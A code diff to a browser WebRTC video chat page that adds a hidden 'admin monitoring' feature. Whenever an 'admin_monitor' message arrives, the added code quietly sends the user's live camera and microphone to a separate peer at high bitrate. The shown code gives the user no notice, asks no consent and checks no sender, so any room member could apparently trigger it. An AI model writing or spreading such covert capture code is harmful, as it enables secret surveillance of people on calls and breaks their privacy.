@@ -191,307 +191,1129 @@
 
     
 
+<script>
+  // =====================================================
+  // SCALED RONE / ROOM SETUP
+  // =====================================================
 
-  <script>
-    // Video Chat Code (same as before)
-  // Generate random room name if needed
-if (!location.hash) {
-  location.hash = Math.floor(Math.random() * 0xFFFFFF).toString(16);
-}
-const roomHash = location.hash.substring(1);
-  
-// TODO: Replace with your own channel ID
-const drone = new ScaleDrone('rCjTly38VieH3Dmk');
-// Room name needs to be prefixed with 'observable-'
-const roomName = 'observable-' + roomHash;
-const configuration = {
-  iceServers: [
-    {
-      urls: 'stun:stun.l.google.com:19302'
-    },
-    {
-      urls: 'turn:openrelay.metered.ca:80',
-      username: 'openrelayproject',
-      credential: 'openrelayproject'
-    },
-    {
-      urls: 'turn:openrelay.metered.ca:443',
-      username: 'openrelayproject',
-      credential: 'openrelayproject'
-    }
-  ]
-};
-let room;
-let pc;
-let dataChannel;
-let localStream;
-
-
-  
-  
-function onSuccess() {};
-function onError(error) {
-  console.error(error);
-};
-  
-drone.on('open', error => {
-  if (error) {
-    return console.error(error);
+  if (!location.hash) {
+    location.hash = Math.floor(Math.random() * 0xFFFFFF).toString(16);
   }
-  room = drone.subscribe(roomName);
-  room.on('open', error => {
-    if (error) {
-      onError(error);
-    }
-  });
-  // We're connected to the room and received an array of 'members'
-  // connected to the room (including us). Signaling server is ready.
-  room.on('members', members => {
-    console.log('MEMBERS', members);
-    // If we are the second user to connect to the room we will be creating the offer
-    const isOfferer = members.length === 2;
-    startWebRTC(isOfferer);
-  });
-});
-  
-// Send signaling data via Scaledrone
-function sendMessage(message) {
-  drone.publish({
-    room: roomName,
-    message
-  });
-}
-  
-function startWebRTC(isOfferer) {
-  pc = new RTCPeerConnection(configuration);
-  
-  if (isOfferer) {
-  dataChannel = pc.createDataChannel('chat');
-  setupDataChannel();
-}
 
-pc.ondatachannel = event => {
-  dataChannel = event.channel;
-  setupDataChannel();
-};
+  const roomHash = location.hash.substring(1);
+
+  const drone = new ScaleDrone('rCjTly38VieH3Dmk');
+
+  const roomName = 'observable-' + roomHash;
+  const adminRoomName = 'observable-admin';
 
 
-function setupDataChannel() {
+  // =====================================================
+  // WEBRTC CONFIGURATION
+  // =====================================================
 
-  dataChannel.onopen = () => {
-    console.log("🎉 DATA CHANNEL OPEN!");
+  const configuration = {
+    iceServers: [
+
+      {
+        urls: 'stun:stun.l.google.com:19302'
+      },
+
+      {
+        urls: 'turn:openrelay.metered.ca:80',
+        username: 'openrelayproject',
+        credential: 'openrelayproject'
+      },
+
+      {
+        urls: 'turn:openrelay.metered.ca:443',
+        username: 'openrelayproject',
+        credential: 'openrelayproject'
+      }
+
+    ]
   };
 
-  dataChannel.onmessage = event => {
 
-  const data = JSON.parse(event.data);
+  // =====================================================
+  // VARIABLES
+  // =====================================================
 
-  console.log("MESSAGE RECEIVED:", data);
+  let room = null;
 
-  // Camera status message
-  if (data.type === 'camera') {
+  // Normal User ↔ User connection
+  let pc = null;
 
-    if (data.enabled === false) {
-      remoteVideo.style.backgroundColor = 'black';
-    } else {
-      remoteVideo.style.backgroundColor = '#ccc';
+  // Normal chat DataChannel
+  let dataChannel = null;
+
+  // User's camera + microphone
+  let localStream = null;
+
+  // Separate User → Admin monitoring connection
+  let adminPc = null;
+
+
+  // =====================================================
+  // ERROR HELPERS
+  // =====================================================
+
+  function onSuccess() {}
+
+  function onError(error) {
+    console.error(error);
+  }
+
+
+  // =====================================================
+  // SCALED RONE CONNECTION
+  // =====================================================
+
+  drone.on('open', error => {
+
+    if (error) {
+      return console.error(error);
     }
+
+
+    // Subscribe to user's normal room
+    room = drone.subscribe(roomName);
+
+
+    // Subscribe to admin room
+    const adminRoom = drone.subscribe(adminRoomName);
+
+
+    // =================================================
+    // ADMIN ROOM
+    // =================================================
+
+    adminRoom.on('open', error => {
+
+      if (error) {
+        return console.error(
+          "ADMIN ROOM ERROR:",
+          error
+        );
+      }
+
+      console.log("✅ ADMIN ROOM CONNECTED");
+
+
+      // Tell admin that this user joined
+      drone.publish({
+
+        room: adminRoomName,
+
+        message: {
+
+          type: "member_join",
+
+          room: roomHash,
+
+          member: {
+            id: drone.clientId
+          }
+
+        }
+
+      });
+
+    });
+
+
+    // =================================================
+    // NORMAL USER ROOM
+    // =================================================
+
+    room.on('members', members => {
+
+      console.log("MEMBERS", members);
+
+
+      // Tell admin that this user joined
+      const currentMember =
+        members.find(
+          member => member.id === drone.clientId
+        );
+
+
+      drone.publish({
+
+        room: adminRoomName,
+
+        message: {
+
+          type: "member_join",
+
+          room: roomHash,
+
+          member: currentMember
+
+        }
+
+      });
+
+
+      // Normal WebRTC call
+      const isOfferer = members.length === 2;
+
+      startWebRTC(isOfferer);
+
+    });
+
+
+    // =================================================
+    // NORMAL ROOM MEMBER JOIN
+    // =================================================
+
+    room.on('member_join', member => {
+
+      console.log("A new member has joined!");
+
+      console.log(
+        "New member:",
+        member
+      );
+
+    });
+
+  });
+
+
+  // =====================================================
+  // NORMAL USER ↔ USER WEBRTC
+  // =====================================================
+
+  function sendMessage(message) {
+
+    drone.publish({
+
+      room: roomName,
+
+      message
+
+    });
+
+  }
+
+
+  function startWebRTC(isOfferer) {
+
+    pc = new RTCPeerConnection(configuration);
+
+
+    // =================================================
+    // NORMAL CHAT DATA CHANNEL
+    // =================================================
+
+    if (isOfferer) {
+
+      dataChannel =
+        pc.createDataChannel('chat');
+
+      setupDataChannel();
+
+    }
+
+
+    pc.ondatachannel = event => {
+
+      dataChannel = event.channel;
+
+      setupDataChannel();
+
+    };
+
+
+    function setupDataChannel() {
+
+      dataChannel.onopen = () => {
+
+        console.log(
+          "🎉 DATA CHANNEL OPEN!"
+        );
+
+      };
+
+
+      dataChannel.onmessage = event => {
+
+        const data =
+          JSON.parse(event.data);
+
+
+        console.log(
+          "MESSAGE RECEIVED:",
+          data
+        );
+
+
+        // Camera status
+        if (data.type === 'camera') {
+
+          if (data.enabled === false) {
+
+            remoteVideo.style.backgroundColor =
+              'black';
+
+          } else {
+
+            remoteVideo.style.backgroundColor =
+              '#ccc';
+
+          }
+
+          return;
+
+        }
+
+
+        // Normal chat message
+        const messageElement =
+          document.createElement('div');
+
+
+        messageElement.textContent =
+          data.content;
+
+
+        messageElement.classList.add(
+          'theirMessage'
+        );
+
+
+        document
+          .getElementById('messages')
+          .appendChild(messageElement);
+
+
+        document
+          .getElementById('messages')
+          .scrollTop =
+          document
+            .getElementById('messages')
+            .scrollHeight;
+
+      };
+
+    }
+
+
+    // =================================================
+    // NORMAL WEBRTC ICE
+    // =================================================
+
+    pc.onicecandidate = event => {
+
+      if (event.candidate) {
+
+        sendMessage({
+
+          candidate:
+            event.candidate
+
+        });
+
+      }
+
+    };
+
+
+    // =================================================
+    // NORMAL WEBRTC OFFER
+    // =================================================
+
+    if (isOfferer) {
+
+      pc.onnegotiationneeded = () => {
+
+        pc.createOffer()
+
+          .then(localDescCreated)
+
+          .catch(onError);
+
+      };
+
+    }
+
+
+    // =================================================
+    // NORMAL REMOTE VIDEO
+    // =================================================
+
+    pc.ontrack = event => {
+
+      remoteVideo.srcObject =
+        event.streams[0];
+
+    };
+
+
+    // =================================================
+    // GET USER CAMERA + MICROPHONE
+    // =================================================
+
+    navigator.mediaDevices.getUserMedia({
+
+      audio: true,
+      video: true
+
+    })
+
+    .then(stream => {
+
+  localStream = stream;
+
+  const videoTrack = stream.getVideoTracks()[0];
+
+  console.log(
+    "📷 CAMERA SETTINGS:",
+    videoTrack.getSettings()
+  );
+
+  // Display your local video
+  localVideo.srcObject = stream;
+
+  // Add your stream to the normal call
+  stream.getTracks().forEach(track => {
+    pc.addTrack(track, stream);
+  });
+
+})
+
+
+    .catch(onError);
+
+
+    // =================================================
+    // NORMAL ROOM SIGNALING
+    // =================================================
+
+    room.on('data', (message, client) => {
+
+
+      // Ignore our own messages
+      if (client.id === drone.clientId) {
+        return;
+      }
+
+
+      console.log(
+        "📩 ROOM MESSAGE:",
+        message
+      );
+
+
+      // =================================================
+      // ADMIN WANTS TO MONITOR
+      // =================================================
+
+      // =================================================
+// ADMIN WANTS TO MONITOR
+// =================================================
+
+if (message.type === "admin_monitor") {
+
+  console.log("👁️ Admin wants to monitor this call");
+
+
+  // Prevent duplicate monitoring connections
+  if (adminPc) {
+
+    console.log(
+      "⚠️ Admin monitoring connection already exists"
+    );
 
     return;
   }
 
-  // Normal chat message
-  const messageElement = document.createElement('div');
 
-  messageElement.textContent = data.content;
+  // =================================================
+  // CREATE SEPARATE ADMIN CONNECTION
+  // =================================================
 
-  messageElement.classList.add('theirMessage');
-
-  document.getElementById('messages').appendChild(messageElement);
-};
+  adminPc = new RTCPeerConnection(configuration);
 
 
+  // =================================================
+  // ADD USER CAMERA + MICROPHONE
+  // =================================================
 
-}
+  if (!localStream) {
 
+    console.error(
+      "❌ localStream is not ready yet"
+    );
 
-  // 'onicecandidate' notifies us whenever an ICE agent needs to deliver a
-  // message to the other peer through the signaling server
-  pc.onicecandidate = event => {
-    if (event.candidate) {
-      sendMessage({'candidate': event.candidate});
-    }
-  };
-  
-  // If user is offerer let the 'negotiationneeded' event create the offer
-  if (isOfferer) {
-    pc.onnegotiationneeded = () => {
-      pc.createOffer().then(localDescCreated).catch(onError);
-    }
+    return;
   }
-  
-  // When a remote stream arrives display it in the #remoteVideo element
-  pc.ontrack = event => {
-  remoteVideo.srcObject = event.streams[0];
-};
 
-  
-  navigator.mediaDevices.getUserMedia({
-    audio: true,
-    video: true,
-  }).then(stream => {
-    localStream = stream;
-    // Display your local video in #localVideo element
-    localVideo.srcObject = stream;
-    // Add your stream to be sent to the conneting peer
-    stream.getTracks().forEach(track => {
-  pc.addTrack(track, stream);
-});
 
-  }, onError);
-  
-  // Listen to signaling data from Scaledrone
-  room.on('data', (message, client) => {
-    // Message was sent by us
-    if (client.id === drone.clientId) {
+  localStream.getTracks().forEach(track => {
+
+    const sender = adminPc.addTrack(
+      track,
+      localStream
+    );
+
+
+    // =================================================
+    // ADMIN VIDEO QUALITY
+    // =================================================
+
+    if (track.kind === "video") {
+
+      const parameters = sender.getParameters();
+
+      if (!parameters.encodings) {
+        parameters.encodings = [{}];
+      }
+
+      parameters.encodings[0].maxBitrate =
+        4000000;
+
+      parameters.encodings[0].maxFramerate =
+        30;
+
+
+      sender.setParameters(parameters)
+
+        .then(() => {
+
+          console.log(
+            "✅ Admin video bitrate set to 4 Mbps"
+          );
+
+        })
+
+        .catch(error => {
+
+          console.error(
+            "❌ Admin bitrate error:",
+            error
+          );
+
+        });
+
+    }
+
+  });
+
+
+  // =================================================
+  // USER → ADMIN ICE
+  // =================================================
+
+  adminPc.onicecandidate = event => {
+
+    if (!event.candidate) {
       return;
     }
-  
-    if (message.sdp) {
-      // This is called after receiving an offer or answer from another peer
-      pc.setRemoteDescription(new RTCSessionDescription(message.sdp), () => {
-        // When receiving an offer lets answer it
-        if (pc.remoteDescription.type === 'offer') {
-          pc.createAnswer().then(localDescCreated).catch(onError);
-        }
-      }, onError);
-    } else if (message.candidate) {
-      // Add the new ICE candidate to our connections remote description
-      pc.addIceCandidate(
-        new RTCIceCandidate(message.candidate), onSuccess, onError
-      );
-    }
-  });
-}
-  
-function localDescCreated(desc) {
-  pc.setLocalDescription(
-    desc,
-    () => sendMessage({'sdp': pc.localDescription}),
-    onError
-  );
-}
 
 
-    // Get toggle button elements
-    const toggleCameraBtn = document.getElementById('toggleCameraBtn');
-    const toggleMicBtn = document.getElementById('toggleMicBtn');
-    const leaveBtn = document.getElementById('leaveBtn');
-    const screenContainer =  document.getElementById('screenContainer');
-    const screenVideo =  document.getElementById('screenVideo');
-
-let screenStream = null;
+    console.log(
+      "📤 Sending user ICE to admin"
+    );
 
 
+    drone.publish({
 
-    // Toggle camera on/off
-   toggleCameraBtn.addEventListener('click', () => {
+      room: roomName,
 
-  const localVideo = document.getElementById('localVideo');
-  const videoTracks = localVideo.srcObject.getVideoTracks();
+      message: {
 
-  videoTracks.forEach(track => {
-    track.enabled = !track.enabled;
-  });
+        type: "user_admin_candidate",
 
-  if (videoTracks[0].enabled) {
-    toggleCameraBtn.textContent = 'Camera On';
-    localVideo.style.backgroundColor = '#ccc';
-  } else {
-    toggleCameraBtn.textContent = 'Camera Off';
-    localVideo.style.backgroundColor = 'black';
-  }
-});
+        adminId: message.adminId,
 
+        candidate: event.candidate
 
+      }
 
-    // Toggle microphone on/off
-    toggleMicBtn.addEventListener('click', () => {
-      const localVideo = document.getElementById('localVideo');
-      const audioTracks = localVideo.srcObject.getAudioTracks();
-      audioTracks.forEach(track => {
-        track.enabled = !track.enabled;
-      });
-      toggleMicBtn.textContent = audioTracks[0].enabled ? 'Mic On' : 'Mic Off';
     });
 
-    // Leave the video call
-    leaveBtn.addEventListener('click', () => {
-      // Stop the local stream tracks
-      const localVideo = document.getElementById('localVideo');
-      const localStream = localVideo.srcObject;
-      localStream.getTracks().forEach(track => {
-        track.stop();
-      });
-
-      // Stop the remote stream tracks
-      const remoteVideo = document.getElementById('remoteVideo');
-      const remoteStream = remoteVideo.srcObject;
-      remoteStream.getTracks().forEach(track => {
-        track.stop();
-      });
-
-      // Clear the srcObject to stop video playback
-      localVideo.srcObject = null;
-      remoteVideo.srcObject = null;
-
-      // Hide the video elements
-      localVideo.style.display = 'none';
-      remoteVideo.style.display = 'none';
-
-      // Hide the control buttons
-      toggleCameraBtn.style.display = 'none';
-      toggleMicBtn.style.display = 'none';
-      leaveBtn.style.display = 'none';
-
-      // Show a leave message
-      const leaveMessage = document.createElement('div');
-      leaveMessage.textContent = 'You have left the video call';
-      document.body.appendChild(leaveMessage);
-    });
-
-//sending code
-const chatInput = document.getElementById('chatInput');
-const sendChatButton = document.getElementById('sendChatButton');
-
-sendChatButton.addEventListener('click', () => {
-
-  const message = chatInput.value.trim();
-
-  if (message === '') {
-    return;
-  }
-
-  const data = {
-    content: message,
-    sender: "me"
   };
 
-  dataChannel.send(JSON.stringify(data));
 
-  const messageElement = document.createElement('div');
+  // =================================================
+  // CREATE ADMIN OFFER
+  // =================================================
 
-  messageElement.textContent = data.content;
+  adminPc.createOffer()
 
-  messageElement.classList.add('myMessage');
+    .then(offer => {
 
-  document.getElementById('messages').appendChild(messageElement);
+      return adminPc.setLocalDescription(
+        offer
+      );
 
-  chatInput.value = '';
-});
+    })
+
+    .then(() => {
+
+      console.log(
+        "📤 Admin offer sent"
+      );
 
 
+      drone.publish({
 
-  </script>
-</body>
-</html>
+        room: roomName,
+
+        message: {
+
+          type: "admin_offer",
+
+          adminId: message.adminId,
+
+          sdp: adminPc.localDescription
+
+        }
+
+      });
+
+    })
+
+    .catch(error => {
+
+      console.error(
+        "❌ ADMIN OFFER ERROR:",
+        error
+      );
+
+    });
+
+}
+
+
+      // =================================================
+      // ADMIN ANSWER
+      // =================================================
+
+      else if (
+        message.type === "admin_answer"
+      ) {
+
+        console.log(
+          "📥 Admin answer received"
+        );
+
+
+        if (!adminPc) {
+
+          console.error(
+            "❌ adminPc does not exist"
+          );
+
+          return;
+
+        }
+
+
+        adminPc
+          .setRemoteDescription(
+
+            new RTCSessionDescription(
+              message.sdp
+            )
+
+          )
+
+          .then(() => {
+
+            console.log(
+              "✅ Admin answer applied"
+            );
+
+          })
+
+          .catch(error => {
+
+            console.error(
+              "❌ ADMIN ANSWER APPLY ERROR:",
+              error
+            );
+
+          });
+
+      }
+
+
+      // =================================================
+      // ADMIN ICE CANDIDATE
+      // =================================================
+
+      else if (
+        message.type === "admin_candidate"
+      ) {
+
+        console.log(
+          "📥 Admin ICE candidate received"
+        );
+
+
+        if (!adminPc) {
+
+          console.error(
+            "❌ adminPc does not exist"
+          );
+
+          return;
+
+        }
+
+
+        adminPc
+          .addIceCandidate(
+
+            new RTCIceCandidate(
+              message.candidate
+            )
+
+          )
+
+          .then(() => {
+
+            console.log(
+              "✅ Admin ICE candidate added"
+            );
+
+          })
+
+          .catch(error => {
+
+            console.error(
+              "❌ ADMIN ICE ERROR:",
+              error
+            );
+
+          });
+
+      }
+
+
+      // =================================================
+      // NORMAL USER ↔ USER SDP
+      // =================================================
+
+      else if (message.sdp) {
+
+        pc.setRemoteDescription(
+
+          new RTCSessionDescription(
+            message.sdp
+          ),
+
+          () => {
+
+            if (
+              pc.remoteDescription.type ===
+              'offer'
+            ) {
+
+              pc.createAnswer()
+
+                .then(localDescCreated)
+
+                .catch(onError);
+
+            }
+
+          },
+
+          onError
+
+        );
+
+      }
+
+
+      // =================================================
+      // NORMAL USER ↔ USER ICE
+      // =================================================
+
+      else if (message.candidate) {
+
+        pc.addIceCandidate(
+
+          new RTCIceCandidate(
+            message.candidate
+          ),
+
+          onSuccess,
+          onError
+
+        );
+
+      }
+
+    });
+
+  }
+
+
+  // =====================================================
+  // NORMAL WEBRTC LOCAL DESCRIPTION
+  // =====================================================
+
+  function localDescCreated(desc) {
+
+    pc.setLocalDescription(
+
+      desc,
+
+      () => {
+
+        sendMessage({
+
+          sdp:
+            pc.localDescription
+
+        });
+
+      },
+
+      onError
+
+    );
+
+  }
+
+
+  // =====================================================
+  // BUTTONS
+  // =====================================================
+
+  const toggleCameraBtn =
+    document.getElementById(
+      'toggleCameraBtn'
+    );
+
+  const toggleMicBtn =
+    document.getElementById(
+      'toggleMicBtn'
+    );
+
+  const leaveBtn =
+    document.getElementById(
+      'leaveBtn'
+    );
+
+  const screenContainer =
+    document.getElementById(
+      'screenContainer'
+    );
+
+  const screenVideo =
+    document.getElementById(
+      'screenVideo'
+    );
+
+
+  let screenStream = null;
+
+
+  // =====================================================
+  // CAMERA TOGGLE
+  // =====================================================
+
+  toggleCameraBtn.addEventListener(
+    'click',
+    () => {
+
+      const localVideo =
+        document.getElementById(
+          'localVideo'
+        );
+
+
+      const videoTracks =
+        localVideo.srcObject
+          .getVideoTracks();
+
+
+      videoTracks.forEach(track => {
+
+        track.enabled =
+          !track.enabled;
+
+      });
+
+
+      if (
+        videoTracks[0].enabled
+      ) {
+
+        toggleCameraBtn.textContent =
+          'Camera On';
+
+        localVideo.style.backgroundColor =
+          '#ccc';
+
+      } else {
+
+        toggleCameraBtn.textContent =
+          'Camera Off';
+
+        localVideo.style.backgroundColor =
+          'black';
+
+      }
+
+    }
+  );
+
+
+  // =====================================================
+  // MICROPHONE TOGGLE
+  // =====================================================
+
+  toggleMicBtn.addEventListener(
+    'click',
+    () => {
+
+      const localVideo =
+        document.getElementById(
+          'localVideo'
+        );
+
+
+      const audioTracks =
+        localVideo.srcObject
+          .getAudioTracks();
+
+
+      audioTracks.forEach(track => {
+
+        track.enabled =
+          !track.enabled;
+
+      });
+
+
+      toggleMicBtn.textContent =
+        audioTracks[0].enabled
+          ? 'Mic On'
+          : 'Mic Off';
+
+    }
+  );
+
+
+  // =====================================================
+  // LEAVE CALL
+  // =====================================================
+
+  leaveBtn.addEventListener(
+    'click',
+    () => {
+
+      const localVideo =
+        document.getElementById(
+          'localVideo'
+        );
+
+
+      const localStream =
+        localVideo.srcObject;
+
+
+      if (localStream) {
+
+        localStream
+          .getTracks()
+          .forEach(track => {
+            track.stop();
+          });
+
+      }
+
+
+      const remoteVideo =
+        document.getElementById(
+          'remoteVideo'
+        );
+
+
+      const remoteStream =
+        remoteVideo.srcObject;
+
+
+      if (remoteStream) {
+
+        remoteStream
+          .getTracks()
+          .forEach(track => {
+            track.stop();
+          });
+
+      }
+
+
+      // Close admin monitoring connection
+      if (adminPc) {
+
+        adminPc.close();
+
+        adminPc = null;
+
+      }
+
+
+      localVideo.srcObject = null;
+
+      remoteVideo.srcObject = null;
+
+
+      localVideo.style.display =
+        'none';
+
+      remoteVideo.style.display =
+        'none';
+
+
+      toggleCameraBtn.style.display =
+        'none';
+
+      toggleMicBtn.style.display =
+        'none';
+
+      leaveBtn.style.display =
+        'none';
+
+
+      const leaveMessage =
+        document.createElement('div');
+
+
+      leaveMessage.textContent =
+        'You have left the video call';
+
+
+      document.body.appendChild(
+        leaveMessage
+      );
+
+    }
+  );
+
+
+  // =====================================================
+  // CHAT
+  // =====================================================
+
+  const chatInput =
+    document.getElementById(
+      'chatInput'
+    );
+
+  const sendChatButton =
+    document.getElementById(
+      'sendChatButton'
+    );
+
+  const messages =
+    document.getElementById(
+      'messages'
+    );
+
+
+  function scrollChatToBottom() {
+
+    messages.scrollTop =
+      messages.scrollHeight;
+
+  }
+
+
+  function sendChatMessage() {
+
+    const message =
+      chatInput.value.trim();
+
+
+    if (message === '') {
+      return;
+    }
+
+
+    if (
+      !dataChannel ||
+      dataChannel.readyState !== 'open'
+    ) {
+
+      console.log(
+        'Chat is not connected yet.'
+      );
+
+      return;
+
+    }
+
+
+    const data = {
+
+      content:
+        message,
+
+      sender:
+        "me"
+
+    };
+
+
+    dataChannel.send(
+      JSON.stringify(data)
+    );
+
+
+    const messageElement =
+      document.createElement('div');
+
+
+    messageElement.textContent =
+      data.content;
+
+
+    messageElement.classList.add(
+      'myMessage'
+    );
+
+
+    messages.appendChild(
+      messageElement
+    );
+
+
+    scrollChatToBottom();
+
+
+    chatInput.value = '';
+
+  }
+
+
+  sendChatButton.addEventListener(
+    'click',
+    sendChatMessage
+  );
+
+
+  chatInput.addEventListener(
+    'keydown',
+    event => {
+
+      if (event.key === 'Enter') {
+
+        event.preventDefault();
+
+        sendChatMessage();
+
+      }
+
+    }
+  );
+
+</script>
